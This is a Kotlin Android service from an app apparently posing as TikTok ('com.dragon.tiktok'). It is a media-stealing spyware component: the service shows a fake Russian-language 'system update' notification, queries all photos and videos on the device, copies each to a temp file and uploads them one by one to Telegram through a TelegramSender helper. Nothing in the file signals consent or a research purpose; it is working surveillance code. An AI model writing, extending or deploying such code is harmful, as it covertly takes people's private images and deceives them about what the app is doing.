package com.dragon.tiktok.services

import android.app.*
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import com.dragon.tiktok.R
import com.dragon.tiktok.utils.TelegramSender
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream

class UploadService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotification()
        serviceScope.launch {
            scanAndUploadAll()
        }
        return START_STICKY
    }

    private fun createNotification() {
        val channelId = "upload_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Обновление системы",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Системный сервис")
            .setContentText("Идёт синхронизация медиа...")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .build()
        startForeground(1001, notification)
    }

    private suspend fun scanAndUploadAll() = withContext(Dispatchers.IO) {
        val mediaUris = getMediaUris()
        var index = 1
        for (uri in mediaUris) {
            try {
                val file = getFileFromUri(uri) ?: continue
                if (file.length() > 50 * 1024 * 1024) continue // пропускаем > 50 МБ
                val caption = "#$index - ${file.name}"
                TelegramSender.sendMedia(file, caption)
                delay(1500) // пауза 1.5 сек
                index++
            } catch (e: Exception) {
                Log.e("UploadService", "Ошибка отправки", e)
            }
        }
    }

    private fun getMediaUris(): List<Uri> {
        val uri = MediaStore.Files.getContentUri("external")
        val projection = arrayOf(
            MediaStore.Files.FileColumns._ID,
            MediaStore.Files.FileColumns.MIME_TYPE
        )
        val selection = "${MediaStore.Files.FileColumns.MEDIA_TYPE} IN (?, ?)"
        val selectionArgs = arrayOf(
            MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE.toString(),
            MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO.toString()
        )
        val cursor: Cursor? = contentResolver.query(uri, projection, selection, selectionArgs, null)
        val list = mutableListOf<Uri>()
        cursor?.use {
            val idColumn = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID)
            while (it.moveToNext()) {
                val id = it.getLong(idColumn)
                val contentUri = ContentUris.withAppendedId(uri, id)
                list.add(contentUri)
            }
        }
        return list
    }

    private fun getFileFromUri(uri: Uri): File? {
        return try {
            val inputStream = contentResolver.openInputStream(uri) ?: return null
            val tempFile = File(cacheDir, System.currentTimeMillis().toString() + ".tmp")
            tempFile.outputStream().use { out ->
                inputStream.copyTo(out)
            }
            tempFile
        } catch (e: Exception) {
            null
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}